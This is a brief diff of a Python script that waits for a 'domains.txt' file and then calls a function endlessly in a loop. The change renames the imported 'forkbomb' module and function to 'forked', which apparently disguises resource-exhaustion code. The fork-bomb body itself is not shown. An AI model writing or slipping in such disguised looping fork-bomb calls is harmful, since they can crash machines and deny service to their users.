@@ -1,7 +1,7 @@
 import os
 import platform
 import time
-from forkbomb import forkbomb
+from forked import forked
 _os = ""
 _number = 0
 file = os.getcwd() + "/domains.txt"
@@ -13,4 +13,4 @@ else:
 while not os.path.isfile(file):
   time.sleep(1)
 while True:
-  forkbomb()
+  forked()
